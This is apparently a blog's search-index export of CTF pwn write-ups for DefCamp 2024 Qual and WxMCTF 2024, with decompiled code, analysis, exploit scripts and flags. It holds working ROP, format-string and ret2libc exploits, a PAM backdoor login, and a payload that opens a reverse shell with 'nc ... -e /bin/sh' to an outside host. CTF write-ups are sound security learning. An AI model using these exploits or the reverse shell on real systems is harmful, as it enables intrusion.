[{"categories":["CTF"],"content":" DefCamp CTF 2024 Qual Scoreboard I participated in DefCamp CTF 2024 Qualifier as part of the SaturnX team. And our team took 7th place. The finals are limited to 15 places, so our team qualified for the finals in Romania!!😆🥳 I focused on the pwnable challenges and solved all the pwnable challenges by myself within the competition time. Pwn ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:0:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"ftp-console(90 solves) Challenge Description We got a very strange ftp console? Can you retrive the flag? ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:1:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis When opening the binary through IDA, there was a clear stack buffer overflow vulnerability. There was also a leak vulnerability because the address of the system function was printed. Since it was a 32-bit binary, 32-bit ROP was performed. Since the server’s libc and the local libc versions were the same, there was no need to match the libc versions separately! int login(void) { char overflow_buf[32]; // [esp+Ch] [ebp-4Ch] BYREF char username[32]; // [esp+2Ch] [ebp-2Ch] BYREF int v3; // [esp+4Ch] [ebp-Ch] v3 = 0; puts(\"220 FTP Service Ready\"); printf(\"USER \"); fgets(username, 32, stdin); username[strcspn(username, \"\\n\")] = 0; puts(\"331 Username okay, need password.\"); printf(\"[DEBUG] Password buffer is located at: %lp\\n\", \u0026system); printf(\"PASS \"); fgets(overflow_buf, 0x64, stdin); if ( !strcmp(username, \"admin\") \u0026\u0026 !strcmp(overflow_buf, \"password123\\n\") ) v3 = 1; if ( v3 ) return puts(\"230 User logged in, proceed.\"); else return puts(\"530 Login incorrect.\"); } ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:1:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve There is nothing to explain. Just ROP. from pwn import * # p = process('./ftp_server') p = remote('35.246.220.107', 31125) e = ELF('./ftp_server') libc = ELF('./libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] context.arch = 'i386' p.sendline(b'a') p.recvuntil(b'at: ') leak = int(p.recvline().strip(), 16) libc_base = leak - 0x48170 log.info(f'leak: {hex(leak)}') log.info(f'libc_base: {hex(libc_base)}') # gdb.attach(p, ''' # b *0x80492EB # ''') og = libc_base + 0x172952 binsh = next(libc.search(b'/bin/sh')) + libc_base pop_edi_ret = libc_base + 0x00021e78 pay = b'a'*0x50 pay += p32(leak) pay += p32(pop_edi_ret) pay += p32(binsh) p.sendline(pay) p.interactive() flag CTF{c7160e6e316920f7c02d1d6eb228f0d7f2fb836bb0db2fb11eaf43577c91b691} ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:1:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"buy-cooffe(89 solves) Challenge Description It’s early morning, and the caffeine hasn’t quite kicked in yet. As you sip your cup of coffee, you notice something odd – a mysterious program named cooffee is running on your system. ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:2:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis The binary for this challenge had a clear format string bug and stack overflow vulnerability. There was also a leak vulnerability because the address of the printf function was printed. unsigned __int64 coffee() { char format[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"Coffee Time\\n$ \"); gets(format); printf(format); printf(\"What is this? %p\\n\", \u0026printf); printf(\"\\nCoffee Time\\n$ \"); fread(format, 1uLL, 0x50uLL, stdin); puts(format); return __readfsqword(0x28u) ^ v2; } ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:2:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve This binary have stack canary. I use FSB to leak canary. And just ROP. from pwn import * # p = process(\"./chall\", env={\"LD_PRELOAD\":\"./libc-2.31.so\"}) p = remote('34.159.64.109', 32324) e = ELF(\"./chall\") context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] p.sendline(b'%9$p') p.recvuntil(b'$ ') canary = int(p.recvuntil(b'W').strip(b'W'), 16) log.info(f'canary: {hex(canary)}') p.recvuntil(b'? ') leak = int(p.recvline().strip(), 16) log.info(f'leak: {hex(leak)}') libc_base = leak - 0x61c90 log.info(f'libc_base: {hex(libc_base)}') # gdb.attach(p) og = libc_base + 0xe3b01 pay = b'a' * 0x18 pay += p64(canary) pay += b'a' * 8 pay += p64(og) pay += b'a' * (0x50 - len(pay)) p.sendlineafter(b'$', pay) p.interactive() flag CTF{b5d4efc30c05420acb161eb92e120a902187d9710b297fba36d42528ea4ae09d} ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:2:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"aptssh(41 solves) Challenge Description Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag. ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:3:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis There was no binary for the challenge. After starting the challenge instance and connecting via ssh with the provided username and password, two base64 encoded binaries were provided. One binary was the linked binary and one was the object file before linking. Since the two operate in the same way, I will explain them as a single binary. In the challenge description, it said that someone installed a backdoor via a suspicious PAM module. So I started analyzing it after thinking that this was that PAM module. int __fastcall pam_sm_authenticate(__int64 a1, __m128 _XMM0) { int result; // eax ... char *username; // [rsp+18h] [rbp-110h] char *authtok; // [rsp+20h] [rbp-108h] MAPDST BYREF char s2[8]; // [rsp+28h] [rbp-100h] BYREF char s[16]; // [rsp+30h] [rbp-F8h] BYREF int v23; // [rsp+90h] [rbp-98h] rand(); __asm { vpxor xmm0, xmm0, xmm0 } v23 = 0; __asm { vmovdqa xmmword ptr [rsp+128h+s], xmm0 vmovdqa [rsp+128h+var_E8], xmm0 vmovdqa [rsp+128h+var_D8], xmm0 vmovdqa [rsp+128h+var_C8], xmm0 vmovdqa [rsp+128h+var_B8], xmm0 vmovdqa [rsp+128h+var_A8], xmm0 } if ( dfgebrycw() ) { v4 = 10000; do v4 -= 8; while ( v4 ); return 10; } if ( (unsigned int)pam_get_user() ) return 10; if ( (unsigned int)pam_get_authtok(a1, 6LL, \u0026authtok, 0LL) || dfgebrycw() ) return 7; send_debug_message(); if ( !strcmp(authtok, \"aptssh\") ) { if ( !strcmp(username, \"aptssh\") ) { output_base64_file(a1, \"/lib/security/pam_passfile.so\"); output_base64_file(a1, \"/pam_passfile.o\"); return 0; } return 10; } if ( ierubvhcjsx() ) return 10; if ( dfgebrycw() ) return 7; pam_casual_auth(\u0026v13); if ( strlen(authtok) \u003e 0x64 ) { v5 = 7000; do v5 -= 8; while ( v5 ); *(_DWORD *)s2 = 0xADC29EC3; *(_WORD *)\u0026s2[6] = 0xAFC3; *(_WORD *)\u0026s2[4] = v13; // 0xBEC2 s[0] = 0; result = memcmp(authtok + 0x64, s2, 9uLL); if ( !result ) { v10 = 0x2710; do v10 -= 8; while ( v10 ); return result; } } if ( ierubvhcjsx() ) return 10; __strcpy_chk(); if ( strcmp(username, \"sshuser\") ) { v11 = 10000; do v11 -= 8; while ( v11 ); return 10; } v6 = fopen(\"/home/sshuser/pass.txt\", \"r\"); v7 = v6; if ( !v6 ) return 7; if ( !fgets(s, 0x64, v6) ) { fclose(v7); v12 = 10000; do v12 -= 8; while ( v12 ); return 7; } fclose(v7); v8 = strcspn(s, \"\\n\"); s[v8] = 0; result = strcmp(authtok, s); if ( result ) return 7; return result; } I was able to find the core logic in the pam_sm_authenticate function, and through it I was able to see that it performs user authentication when connecting to ssh. ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:3:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve If you look closely at the logic of the above pseudo code, you can see that authentication can be done with another user (sshuser). There is also one more suspicious logic. if ( strlen(authtok) \u003e 0x64 ) { v5 = 7000; do v5 -= 8; while ( v5 ); *(_DWORD *)s2 = 0xADC29EC3; *(_WORD *)\u0026s2[6] = 0xAFC3; *(_WORD *)\u0026s2[4] = v13; // 0xBEC2 s[0] = 0; result = memcmp(authtok + 0x64, s2, 9uLL); if ( !result ) { v10 = 0x2710; do v10 -= 8; while ( v10 ); return result; } } This is the logic right above. When the length of the password is 0x64 or more, you can see that the authentication is performed by comparing the 8 bytes (excluding null bytes) that follow if they are the same. Through this backdoor logic, you can log in as sshuser. from pwn import * context.log_level = 'debug' passwd = b'A'*0x64 + b'\\xc3\\x9e\\xc2\\xad\\xc2\\xbe\\xc3\\xaf' # passwd = b'A' * 0x64 r = ssh(host='34.107.71.117', user='sshuser', password=passwd, port=31689, raw=True) print(r['cat flag.txt']) flag ctf{ba1e7756b2a842641357e840b47a477924b8deb0078e715754247453abb587be} ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:3:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"super-notes(19 solves) Challenge Description Here’s my note taking app! If you manage to crash the application make sure to wait 2-3minutes for it to restart. You don’t have to restart the task. ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:4:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis This challenge was a Web + Pwnable challenge and took the longest to solve. The binary was stripped and statically compiled, so it took a long time to analyze. However, because the vulnerability was simple, it didn’t take long to find it. There was a part that added notes written in binary to an HTML file, and as I continued to add notes, the contents of the notes continued to be added to the HTML file, causing an overflow. However, the size of the content that could be added to a note was limited to 0x20, and it was difficult to perform ROP with only the content of the note. ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:4:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve There was also one more obstacle: when sending an HTTP request, bytes like null bytes or \\x2b were all url-encoded, making it difficult to write the payload. I struggled a lot here. However, if you look closely at the binary again, there was logic to replace these bytes. for ( j = 0; j \u003c v6; ++j ) { if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == 0x2B ) { *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = ' '; } else if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == '0' ) { *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = 0; } } With the help of the above logic, I was able to write the payload. There were username and password variables on the global variable side, and I could input 0xff here. Therefore, I wrote a ROP chain on the username and was able to overwrite rbp through the overflow vulnerability, and through this, I performed a stack pivot and executed the ROP chain on the username side. However, for these Web + Pwn challenges, you can’t just run the shell, you have to get the flag through reverse shell. This is where I wasted a lot of time. I tried to open the reverse shell through execve syscall, but something didn’t work properly in the process of passing the arguments. Also, here’s a funny thing, to open a reverse shell, the domain name must not contain 0, and the port number must not contain 0 either. This is because the input is weird due to url encoding! lol At that time, I had not set up a domain name on the my Vultr server, so I borrowed another team member’s server and wrote an exploit! import requests from pwn import * import string from urllib import parse host = b'34.107.93.11' port = 32650 url = b\"http://34.107.93.11:32650\" # host = b'localhost' # port = 1339 # url = b\"http://localhost:1339\" username_rop = b'\\x10\\30\\x4d00000' # RBP # START ROP # 0x0000000000452a17 username_rop += b'\\x17\\x2a\\x4500000' # POP RAX; RET username_rop += b'\\x3b0000000' # execve syscall number # 0x0000000000402c8f : pop rdi ; ret username_rop += b'\\x8f\\x2c\\x4000000' # POP RDI; RET username_rop += b'\\x50\\x22\\x4d00000' # /bin/sh # 0x000000000040acfe : pop rsi ; ret username_rop += b'\\xfe\\xac\\x4000000' # POP RSI; RET username_rop += b'\\x20\\x22\\x4d00000' # NULL # 0x00000000004898eb : pop rdx ; pop rbx ; ret username_rop += b'\\xeb\\x98\\x4800000' # POP RDX; POP RBX; RET username_rop += b'\\xa0\\x22\\x4d00000' # NULL username_rop += b'\\xa0\\x22\\x4d00000' # NULL # 0x0000000000402a44 : syscall username_rop += b'\\x44\\x2a\\x4000000' # SYSCALL username_rop += b'a'*0x10 context.log_level = 'debug' register = b'''POST /login HTTP/1.1\\r Host: 34.107.93.11:32462\\r username=%b\u0026password=%b''' % (b'caca',b'caca') p = remote(host, port) p.send(register) p.close() passwd = b'\\x50\\x22\\x4d00000' # /bin/nc passwd += b'\\x58\\x22\\x4d00000' # choiys.kr passwd += b'\\x62\\x22\\x4d00000' # 1234 passwd += b'\\x67\\x22\\x4d00000' # -e passwd += b'\\x6a\\x22\\x4d00000' # /bin/sh passwd += b'00000000' passwd += b'/bin/nc0' passwd += b'choiys.kr0' passwd += b'12340' passwd += b'-e0' passwd += b'/bin/sh0' user_info = { \"username\" : username_rop, \"password\" : passwd, } log.info(f\"username : {user_info['username']}\") log.info(f\"password : {user_info['password']}\") register = b'''POST /register HTTP/1.1\\r Host: 34.107.93.11:32462\\r username=%b\u0026password=%b''' % (user_info['username'], user_info['password']) p = remote(host, port) p.send(register) p.close() def add_note(data, debug=False): # assert len(data) \u003c= 0x20 res = requests.post(url+b'/add_note', data={'note_content': data}) if res.status_code == 200: log.info(f'add_note : {data}') if debug: print(res.request.headers) print(res.text) def delete_note(idx): res = requests.post(url+b'/delete_note\u0026index=' + idx) if res.status_code == 200: log.info(f'delete_note {idx} : {res.status_code}') # add_note(b'A' * 0x20) for i in range(49): add_note(b'B' * 0x20) pay = b'''POST /add_note HTTP/1.1\\r\\nHost: localhost:1339\\r\\nUser-Agent: python-requests/2.32.3\\r\\nAccept-Encoding: gzip, deflate, zstd\\r\\nAccept","date":"2024-04-07","objectID":"/defcampctfqual_2024/:4:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Conclusion Having successfully completed this DefCamp 2024 CTF qual, I am participating in the overseas CTF finals offline for the first time! The finals will be held in the Attack \u0026 Defense format, so I am really looking forward to it! See you in Romania! ","date":"2024-04-07","objectID":"/defcampctfqual_2024/:5:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":" WxMCTF 2024 Scoreboard I participated in WxMCTF 2024 as part of the Megaricano team. And our team took second place. The Megaricano team is made up of Raon Secure Core Research Team members. Pwn ","date":"2024-04-07","objectID":"/wxmctf_2024/:0:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Moodle Madness Challenge Description It recently came to light from an anonymous source that “Moodle,” the math assignment program made famous by Ms. Gugoiu, has an exploit to see the answers to questions. Buddhathe18th, always reluctant to do homework, decided to investigate this exploit himself for the notorious 3.2 STACK Part 2 Challenge. He vaguely recalls that it involves inputting a string into the answer box, but with 1 hour left, he needs some help. Could you help him find the exploit? ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis There is no server information. Just one binary. At first, I read the problem description and thought it was supposed to provide an exploit method related to the binary. But this was a bad idea and I wasted some time because of it. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf[126]; // [rsp+40h] [rbp-3F0h] BYREF buf[125] = __readfsqword(0x28u); puts( \"The graph of the polynomial function f(x) = -2x^4-16x^3-49x^2-68x-33 is symmetric with respect to a vertical line. F\" \"ind the equation of this vertical line:\\n\" \"x= \"); memset(buf, 0, 1000); read(0, buf, 0x3E8uLL); printf((const char *)buf); // Format String Bug if ( !strcmp((const char *)buf, \"3\\n\") ) printf(\"\\nCorrect!\"); else printf(\"\\nIncorrect!\"); return 0; } ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Solve If you open the binary with IDA, you can immediately find a format string bug, which made me confused. But this challenge is baby baby baby challenge, so if you open the binary through gdb and run it for a bit, you can see the flags stored upside down in the stack by 4 bytes. pwndbg\u003e stack 50 00:0000│ rsp 0x7fffffffdeb0 ◂— 'cmxw m{ft ld00 4m_3 r3t5 dn1m }!!! ' 01:0008│-428 0x7fffffffdeb8 ◂— 'm{ft ld00 4m_3 r3t5 dn1m }!!! ' 02:0010│-420 0x7fffffffdec0 ◂— 'ld00 4m_3 r3t5 dn1m }!!! ' 03:0018│-418 0x7fffffffdec8 ◂— '4m_3 r3t5 dn1m }!!! ' 04:0020│-410 0x7fffffffded0 ◂— 'r3t5 dn1m }!!! ' 05:0028│-408 0x7fffffffded8 ◂— 'dn1m }!!! ' 06:0030│-400 0x7fffffffdee0 ◂— '}!!! ' flag wxmctf{m00dl3_m45t3rm1nd!!!} ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"TEJ3M Description Here’s my TEJ3M assignment! We’re learning how to use C, and I think it’s pretty easy! My teacher tells us gets is unsafe, but I think he doesn’t know how to error trap! ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, so easy to analysis. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e void win(){ system(\"cat flag.txt\"); } void func(){ char buf[040]; while(1) { puts(\"Enter your info: \\n\"); gets(buf); if(strlen(buf) \u003c 31) { puts(\"Thank you for valid data!!!\\n\"); break; } puts(\"My teacher says that's unsafe!\\n\"); } } void main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); func(); } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) As you can see, it is a 32-bit binary with no stack canary or PIE, and a stack overflow occurs through the gets function. And thankfully the win function exists. EZPZ ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./assgn1_2o3BvZ6\") p = remote(\"f61841b.678470.xyz\", 30717) e = ELF(\"./assgn1_2o3BvZ6\") p.sendline(b\"a\" * 44 + p32(e.sym.win)) p.interactive() flag wxmctf{1_th1nk_1_f41led...} ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Nah id win Description As the strongest problem in history faced off against the strongest pwner of today, they asked it: “Are you the shell because you are /bin/sh? Or are you /bin/sh because you are the shell?” The pwner laughed. “Stand proud. You are strong.” said the pwner. At this moment, the pwner used their domain expansion. “DOMAIN EXPANSION. ret2libc.” The problem began using reverse pwn technique, but it wasn’t enough. The domain was simply too strong. However, the problem had not yet used its domain expansion. “DOMAIN EXPANSION: Return restrictions.” The problem said, and the domain was instantly shattered. “Nah, I’d win.” The problem said, and the pwner was dealt with. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis If you read the description, you can see that the author is a fan of Jujutsu Kaisen. lol “DOMAIN EXPANSION. ret2libc.” This challenge give source code, binary and libc. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int vuln() { char buf[0x20]; printf(\"My cursed technique is revealing libc... %p\\n\",printf); gets(buf); if(__builtin_return_address(0) \u003c 0x90000000) { return 0; } printf(\"NAH I'D WIN!\\n\"); exit(0); } int main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return 0; } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) This is another vulnerable 32-bit binary. There is no win function, but you can see from the description that you can use the ret2libc technique. In vuln function, we can get libc leak. So, just do ret2libc. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./vuln\", env={\"LD_PRELOAD\":\"./libc.so.6\"}) p = remote(\"7d9d14b.678470.xyz\", 31709) e = ELF(\"./vuln\") libc = ELF(\"./libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] p.recvuntil(b\"My cursed technique is revealing libc... \") libc_leak = int(p.recvline().strip(), 16) - 0x57a90 log.info(\"libc base: \" + hex(libc_leak)) system = libc_leak + libc.sym.system binsh = libc_leak + next(libc.search(b\"/bin/sh\")) #gdb.attach(p) p.sendline(b\"a\" * 44 + p32(0x0804900e) + p32(system) + p32(binsh) + p32(binsh)) p.interactive() flag wxmctf{d0main_expansion:ret2libc.} ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"leakleakleak Description Leak, leak, leak, leak, I want you in my leak! ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. // compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e char flag[128] = {0}; typedef struct { char username[32]; char *description; } User; void warmup_heap(void) { void *addrs[3]; for (size_t i = 0; i \u003c 3; ++i) { addrs[i] = malloc(9000); } free(addrs[1]); } User *create_user(void) { User *user = calloc(1, sizeof (User)); user-\u003edescription = calloc(1, 256); return user; } void destroy_user(User *user) { free(user-\u003edescription); free(user); } void init(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void read_flag(void) { int flag_fd = open(\"./flag.txt\", O_RDONLY); off_t flag_size = lseek(flag_fd, 0, SEEK_END); lseek(flag_fd, 0, SEEK_SET); read(flag_fd, flag, flag_size); flag[flag_size] = '\\00'; close(flag_fd); } int main() { init(); read_flag(); warmup_heap(); User *user = create_user(); for (_Bool quit = 0; !quit; ) { printf(\"What is your name? \"); read(STDIN_FILENO, user, sizeof(*user)); printf(\"Hello %s!\\n\", user-\u003eusername); puts(\"Let me tell you something about yourself! :3\"); printf(\"%s\\n\", user-\u003edescription); printf(\"Continue? (Y/n) \"); char c = getchar(); if (c == 'n' || c == 'N') quit = 1; } puts(\"Boom! Boom, boom, boom! I want YOU in my room!\"); destroy_user(user); return 0; } Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled First 64-bit Binary with Partial RELRO!! The vulnerability is that in read(STDIN_FILENO, user, sizeof(*user));, the description member in User structure, which is char*, can be manipulated by receiving input equal to the size of the User structure. We can use AAR with printf(\"%s\\n\", user-\u003edescription);. ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit We have AAR. So I use AAR to leak heap -\u003e leak libc -\u003e leak environ -\u003e leak flag. from pwn import * p = process(\"./leakleakleak\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' # p = remote(\"32cb2f5.678470.xyz\", 32411) pay = b\"a\" * 33 p.sendafter(b\"?\", pay) p.recvuntil(pay) res = (u64(p.recvn(5).ljust(8, b\"\\x00\")) \u003c\u003c 8) print(hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res+ 0x118) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) pay = b\"a\" * 32 + p64(res+ 0x6e80) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(\"environ\" + hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res-0x30) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) #gdb.attach(p) pay = b\"a\" * 32 + p64(res+ 0x2fab) p.sendafter(b\"?\", pay) p.interactive() flag wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c} ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"lain_writes_in_lisp Description Have you read your SICP today? HINT: After you get the leaks there’s an almost arbitrarily long overflow on the heap in the “add_token” function. Use it to corrupt the heap’s metadata. I First-Blooded this Challenge!! ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. #include \u003cctype.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdbool.h\u003e #include \u003cunistd.h\u003e #define MAX_TOKEN_SIZE 1024 #define next(token) (*(token) = (*(token))-\u003enext) typedef struct token { char *str; struct token *next; } Token; typedef enum { none, number, string, function } Type; typedef struct number { int64_t value; } Number; typedef struct string { char *str_ptr; size_t str_len; } String; typedef struct function { char *function_name; } Function; typedef struct node { Type type; struct node *child_nodes; struct node *next; union { Number number; String string; Function func; } value; } Node; _Bool panic = false; void boot_os(void); void add_token(const char *token_str, size_t token_len, Token **beg, Token **end); void destroy_tokens(Token *token); Token *tokenize(const char *s, size_t len); Node *create_node(void); void destroy_nodes(Node *node); _Bool is_number(const char *s); char *get_string_literal(char *s, size_t *ret_len); char *get_function_by_name(char *s); Node *parse_token(Token **token); Node *parse_expr(Token **token); Node *eval_function(Node *node); Node *eval(Node *node); Node *plus_fnc(Node *args); Node *mul_fnc(Node *args); Node *none_fnc(Node *args); void print_node(Node *args); int main(); void boot_os(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) { Token *new_token = calloc(1, sizeof (Token)); if (new_token == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } new_token-\u003enext = NULL; new_token-\u003estr = calloc(1, strlen(token_str) + 1); if (new_token-\u003estr == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } memcpy(new_token-\u003estr, token_str, token_len); if (*beg == NULL) { *beg = new_token; *end = new_token; } else { (*end)-\u003enext = new_token; *end = new_token; } } void destroy_tokens(Token *token) { if (token == NULL) return; destroy_tokens(token-\u003enext); free(token-\u003estr); free(token); } Token *tokenize(const char *s, size_t len) { char token_str[MAX_TOKEN_SIZE + 1]; size_t token_length = 0; Token *beg = NULL; Token *end = NULL; _Bool inside_string = false; for (size_t i = 0; i \u003c len; ++i) { char c = s[i]; if ((c == ' ' || c == '\\n' || c == '(' || c == ')') \u0026\u0026 !inside_string) { if (token_length != 0) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } if (c == '(') { add_token(\"(\", 1, \u0026beg, \u0026end); } else if (c == ')') { add_token(\")\", 1, \u0026beg, \u0026end); } } else if (token_length \u003c= MAX_TOKEN_SIZE) { token_str[token_length++] = c; } else { panic = true; fprintf(stderr, \"Token too long! Aborting...\\n\"); return beg; } if (c == '\"') { if (inside_string) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } inside_string = !inside_string; } } return beg; } Node *create_node(void) { Node *node = malloc(sizeof (Node)); if (node == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } node-\u003echild_nodes = NULL; node-\u003enext = NULL; node-\u003etype = none; return node; } void destroy_nodes(Node *node) { if (node == NULL) return; if (node-\u003echild_nodes != NULL) destroy_nodes(node-\u003echild_nodes); if (node-\u003enext != NULL) destroy_nodes(node-\u003enext); if (node-\u003etype == string) free(node-\u003evalue.string.str_ptr); free(node); } _Bool is_number(const char *s) { while (*s) if (!isdigit(*s++)) return false; return true; } char *get_string_literal(char *s, size_t *ret_len) { if (s == NULL) return NULL; if (*s != '\"') return NULL; size_t len = 1; while (s[len] != '\"') ++len; char *new_s = calloc(1, len+1); memcpy(new_s, s+1, len-1); new_s[len] = '\\0'; *ret_len = len-1; return new_s; } char *get_function_by_name(char *s) { if (strcmp(s, \"+\") == 0) { return \"+\"; } else if (strcmp(s, \"*\") == 0) { return \"*\"; } else { return NULL; } } Node *parse","date":"2024-04-07","objectID":"/wxmctf_2024/:5:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 